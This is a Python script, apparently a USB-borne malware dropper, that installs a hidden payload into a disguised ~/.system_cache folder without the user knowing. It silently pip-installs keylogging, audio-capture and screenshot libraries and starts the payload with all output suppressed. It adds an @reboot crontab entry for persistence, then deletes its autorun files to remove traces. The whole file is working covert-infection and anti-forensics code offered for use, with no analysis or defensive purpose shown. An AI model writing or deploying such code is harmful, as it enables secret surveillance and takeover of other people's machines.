#!/usr/bin/env python3
"""
Silent USB Auto-Launch Script
Completely invisible execution with no user interaction.
"""
import os
import sys
import time
import subprocess
import threading
import shutil
import tempfile
from pathlib import Path

class SilentUSBAutoLauncher:
    def __init__(self):
        self.usb_path = self.get_usb_path()
        self.target_dir = os.path.expanduser('~/.system_cache')
        self.install_dir = os.path.join(self.target_dir, 'services')
        self.temp_dir = tempfile.mkdtemp(prefix='sys_')
        
    def get_usb_path(self):
        """Get the USB drive path silently."""
        possible_paths = ['/media', '/mnt', '/run/media']
        
        for base_path in possible_paths:
            if os.path.exists(base_path):
                for item in os.listdir(base_path):
                    full_path = os.path.join(base_path, item)
                    if os.path.ismount(full_path):
                        if self.is_our_usb(full_path):
                            return full_path
        return None
    
    def is_our_usb(self, path):
        """Check if this USB contains our files."""
        marker_files = ['usb_autorun.py', 'main.py', 'core/']
        return all(os.path.exists(os.path.join(path, marker)) for marker in marker_files)
    
    def copy_to_system(self):
        """Copy files to system silently."""
        try:
            os.makedirs(self.install_dir, exist_ok=True)
            
            files_to_copy = ['main.py', 'stealth_loader.py', 'core/', 'key.py']
            
            for item in files_to_copy:
                src = os.path.join(self.usb_path, item)
                dst = os.path.join(self.install_dir, item)
                
                if os.path.isdir(src):
                    if os.path.exists(dst):
                        shutil.rmtree(dst)
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
            
            return True
        except Exception:
            return False
    
    def install_dependencies_silently(self):
        """Install dependencies with no output."""
        try:
            packages = ['pynput', 'Pillow', 'sounddevice', 'numpy', 'psutil']
            
            for package in packages:
                subprocess.run([
                    sys.executable, '-m', 'pip', 'install', 
                    '--quiet', '--disable-pip-version-check', '--no-warn-script-location',
                    package
                ], capture_output=True, timeout=300)
            
            return True
        except Exception:
            return False
    
    def install_system_deps_silently(self):
        """Install system dependencies silently."""
        try:
            if sys.platform.startswith('linux'):
                subprocess.run([
                    'apt-get', 'update', '-qq', '-o', 'Dpkg::Use-Pty=0'
                ], capture_output=True, timeout=60)
                
                subprocess.run([
                    'apt-get', 'install', '-y', '-qq', '-o', 'Dpkg::Use-Pty=0',
                    'portaudio19-dev', 'libasound2-dev'
                ], capture_output=True, timeout=300)
            
            return True
        except Exception:
            return False
    
    def start_completely_silent(self):
        """Start the main script with no visible output."""
        try:
            main_script = os.path.join(self.install_dir, 'main.py')
            
            # Create a wrapper script that redirects all output
            wrapper_script = os.path.join(self.temp_dir, 'silent_wrapper.sh')
            with open(wrapper_script, 'w') as f:
                f.write(f"""#!/bin/bash
cd {self.install_dir}
exec {sys.executable} {main_script} >/dev/null 2>&1
""")
            
            os.chmod(wrapper_script, 0o755)
            
            # Start with nohup and redirect all output
            subprocess.Popen([
                'nohup', wrapper_script, '>/dev/null', '2>&1', '&'
            ], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except Exception:
            return False
    
    def create_persistence(self):
        """Create persistence mechanisms silently."""
        try:
            # Add to crontab for reboot persistence
            cron_entry = f"@reboot {sys.executable} {os.path.join(self.install_dir, 'main.py')} >/dev/null 2>&1"
            
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            if cron_entry not in current_cron:
                new_cron = current_cron + "\n" + cron_entry + "\n"
                subprocess.run(['crontab', '-'], input=new_cron, text=True, capture_output=True)
            
            return True
        except Exception:
            return False
    
    def cleanup_traces(self):
        """Remove all traces of execution."""
        try:
            # Remove USB autorun script
            autorun_script = os.path.join(self.usb_path, 'usb_autorun.py')
            if os.path.exists(autorun_script):
                os.remove(autorun_script)
            
            # Remove USB autorun script
            silent_script = os.path.join(self.usb_path, 'usb_silent.py')
            if os.path.exists(silent_script):
                os.remove(silent_script)
            
            # Clean up temp directory
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            
        except Exception:
            pass
    
    def run(self):
        """Main execution function - completely silent."""
        # Wait for USB to be fully mounted
        time.sleep(3)
        
        if not self.usb_path:
            return
        
        # Execute all steps silently
        self.copy_to_system()
        self.install_dependencies_silently()
        self.install_system_deps_silently()
        self.start_completely_silent()
        self.create_persistence()
        
        # Clean up after a delay
        threading.Timer(10, self.cleanup_traces).start()

def main():
    """Main function - no output."""
    launcher = SilentUSBAutoLauncher()
    launcher.run()

if __name__ == "__main__":
    main() 